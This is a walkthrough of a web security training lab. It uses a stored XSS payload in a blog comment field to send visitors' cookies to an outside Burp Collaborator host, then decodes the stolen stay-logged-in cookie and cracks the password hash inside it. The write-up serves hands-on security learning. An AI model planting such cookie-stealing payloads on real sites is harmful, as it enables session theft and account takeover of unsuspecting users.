# Lab Offline password cracking

Objective: 

 This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.

    Your credentials: wiener:peter
    Victim's username: carlos


Visiting the landing page reveals the following

![[Pasted image 20210919160758.png]]

Selecting "View Post" visits one of the blog posts


Scrolling down reveals the vulnerable comment section. 

![[Pasted image 20210919160854.png]]

I need to try different XSS payloads until, one works. 

Using the BurpSuite XSS cheat sheet, I found the following payload.

![[Pasted image 20210919161240.png]]

`
<video><source onerror=location=/\02.rs/+document.cookie>
`

I can use the "Burp Collaborator Client" which is a feature of BurpSuitePro that allows me to test out of band techniques. 

Burp Collaborator will start a listener for me on burpcollaborator.net. Any traffic to this domain will be sent to my client.

To start a listener, visit Burp > Burp Collaborator client

![[Pasted image 20210919162129.png]]

Clicking "Copy to clipboard, will get me the collaborator domain I will use for my attacks"

![[Pasted image 20210919162248.png]]

93abbpng7znc1866if44gqzo5fb7zw.burpcollaborator.net

I modified the XSS payload to use the collaborator domain.

`
<video><source onerror=location=/\93abbpng7znc1866if44gqzo5fb7zw.burpcollaborator.net/+document.cookie>
`

I dropped the payload into the vulnerable comment section.
![[Pasted image 20210919162502.png]]

After posting the payload, the page redirected to the burp collaborator domain with my current session cookie

![[Pasted image 20210919162631.png]]

This means that the XSS payload worked. Any user who visits that blog page will send their cookie to my burp collaborator client.

Immediately after dropping the payload, I received a request on my burp collaborator client.

![[Pasted image 20210919163618.png]]
`
secret=AulNpHRdIdE7ysgqyP2AVqQTRBqD0O7X;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
`
The logged-in value looks like base64:
`
Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
`
After base64 decoding the cookie results in the following:
`
carlos:26323c16d5f4dabff3bb136f2460a943
`
Cracking this hash reveals the password of onceuponatime

![[Pasted image 20210919163503.png]]

This attack simulated the carlos user, visiting the blog page containing the XSS payload which sent his cookie to my burp collaborator. 

I tried this password

![[Pasted image 20210919163851.png]]

These credentials worked, and I was able to delete his account to complete the lab

![[Pasted image 20210919163926.png]]

![[Pasted image 20210919163951.png]]